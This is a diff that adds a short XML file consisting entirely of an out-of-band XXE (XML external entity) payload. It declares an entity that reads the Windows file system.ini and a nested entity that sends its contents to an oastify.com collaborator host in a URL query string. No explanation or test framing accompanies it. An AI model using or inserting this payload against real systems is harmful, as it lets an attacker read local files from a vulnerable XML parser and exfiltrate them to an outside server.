@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///c:/windows/system.ini">
+<!ENTITY % mal "<!ENTITY &#x25; xxe SYSTEM 'http://lk982b17bdi3pfgm3k94kur58wen2hq6.oastify.com/?x=&file;'>">
+%mal;
+%xxe;
+ ]>
